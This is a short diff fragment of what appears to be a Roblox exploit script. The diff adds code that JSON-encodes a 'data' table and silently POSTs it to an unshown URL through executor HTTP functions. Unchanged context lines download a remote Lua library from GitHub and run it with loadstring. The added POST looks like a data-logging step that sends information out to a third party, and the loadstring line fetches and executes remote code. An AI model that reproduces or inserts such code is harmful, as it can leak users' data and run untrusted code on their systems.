@@ -38,6 +38,11 @@ local data = {
         }
     }
 }
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {["content-type"] = "application/json"}
+request = http_request or request or HttpPost 
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 --// Loadstrings
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/0x0b4/loader/refs/heads/main/library.lua", true))()
